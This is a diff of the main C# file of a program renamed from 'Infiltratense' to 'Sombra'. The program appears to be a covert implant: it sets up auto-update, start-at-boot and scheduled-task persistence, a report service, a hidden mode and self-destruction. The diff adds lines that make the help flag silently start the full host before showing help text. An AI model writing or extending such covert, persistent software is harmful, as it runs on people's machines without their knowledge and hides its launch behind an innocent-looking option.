@@ -1,4 +1,4 @@
-﻿using Infiltratense.Models;
+﻿using Sombra.Models;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -6,17 +6,17 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading;
-using Infiltratense.Service;
-using Infiltratense.Middleware;
+using Sombra.Service;
+using Sombra.Middleware;
 using System.Runtime.InteropServices;
 
-namespace Infiltratense
+namespace Sombra
 {
     public class Program
     {
         public static void Main(string[] args)
         {
-            Logger.Print("\n\n Infiltratense by Obisoft.\n\n Version : " + Strings.Version);
+            Logger.Print("\n\n Sombra by Obisoft.\n\n Version : " + Strings.Version);
             if (args.Length > 0)
             {
                 var Arg = args[0];
@@ -25,6 +25,8 @@ namespace Infiltratense
                     case "v":
                         break;
                     case "h":
+                        var host = new HostService().UseStartUp<StartUp>();
+                        host.Run();
                         Logger.Print("\n\n-v -version\t\tView current version number.");
                         Logger.Print("-h -help\t\tView help.");
                         Logger.Print("-s -switch\t\tSwitch to hidden mode.");
@@ -44,6 +46,7 @@ namespace Infiltratense
 
         public static void Run()
         {
+            var reactor = new ReactorService();
 #if DEBUG
             var host = new HostService()
                 .UseAutoUpdateService(CurrentVersion: Strings.Version, Debug: true, ForceCurrent: true)
@@ -51,7 +54,8 @@ namespace Infiltratense
                 .UseStartWithBootService(Set: false)
                 .UseTaskSchedulerService(Disabled: true)
                 .UseReportService(TimeOut: 1000, Delay: true)
-                .UseStartUp<StartUp>();
+                .UseStartUp<StartUp>()
+                .UseReactor(reactor);
 #else
             var host = new HostService()
                 .UseAutoUpdateService(CurrentVersion: Strings.Version, Debug: false, ForceCurrent: false)
@@ -67,12 +71,11 @@ namespace Infiltratense
         public static void SelfDestory()
         {
             var Destoryer = new HostService()
-                           .UseTaskSchedulerService(Disabled: true)
-                           .UseStartWithBootService(Set: false)
-                           .UseStartUp<StartUp>();
+                .UseTaskSchedulerService(Disabled: true)
+                .UseStartWithBootService(Set: false)
+                .UseStartUp<StartUp>();
 
             Destoryer.Run();
-
             Logger.PrintSuccess("Removed all records. Please restart your computer and delete all files by yourself!");
         }
     }
